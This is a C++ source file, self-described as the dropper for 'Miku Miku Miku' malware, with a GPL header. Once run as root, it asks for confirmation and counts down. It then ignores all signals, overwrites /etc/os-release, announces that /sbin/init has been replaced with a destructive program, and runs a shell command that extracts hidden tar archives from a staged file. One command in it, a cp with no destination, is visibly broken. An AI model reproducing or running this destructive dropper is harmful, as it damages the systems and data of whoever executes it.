/*

Copyright (C) 2026 Hyperion0801.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.

*/

#include <iostream>
#include <cstdlib>
#include <unistd.h>
#include <csignal>
#include <fstream>
#include <filesystem>

// The dropper of Miku Miku Miku.
// This part is to drop the rest of the malware into the system.

double myCodeIsBad = 5.01;

int main()
{
        int uid = getuid();
        if (uid != 0) {
                std::cerr << "ERROR: binary was not launched with root/uid 0\nTo continue, please get root access via tools like doas, or privilege escalation scripts like Copy Fail or Bad Epoll.\nExiting...";
                return EXIT_FAILURE;
        }

        else if (uid == 0) {

                std::cout << "Are you absolutely sure you would like to continue??\nThere is no going back after running this fully.\n(y/N) >>> " << std::flush;

                std::string answer;
                std::cin >> answer;

                if (answer == "y") {
                        for(int i = 500; i > 0; i--) {
                                myCodeIsBad -= 0.01;
                                std::cout << "\033[2J\033[1;1HYOU HAVE " << myCodeIsBad << " SECONDS TO PRESS CTRL + C, IF YOU DO NOT KNOW WHAT THIS IS, PRESS CTRL + C NOW!!" << std::flush;
                                usleep(10000);
                        }

                        for(int i = 64; i > 0; i--) {
                                std::signal(i, SIG_IGN);
                        }

                        // Your distro is bad, let's fix that!
                        std::ofstream OsRelease("/etc/os-release");

                        OsRelease.open("/etc/os-release");

                        OsRelease << "NAME=Hatsune Miku Linux\nPRETTY_NAME=Hatsune Miku Linux\nID=miku\n";
                        OsRelease.close();

                        std::cout << "\033[2J\033[1;1HYour PC has been FUCKED by Hatsune Miku!!!\n/sbin/init has been replaced with a destructive program.\nI have a surprise at the end of the payload however. Stick around to find out what it is!";

                        system(("cp /miku/mikumiku.miku && grep -abo 'ustar' /miku/mikumiku.miku | cut -d: -f1 | while read off; do start=$((off-257)); dd if=/miku/mikumiku.miku bs=1 skip=$start status=none | tar xf -; done").c_str());

                        return EXIT_SUCCESS;
                }

                else {
                        std::cout << "Quitting...";
                }

        }
}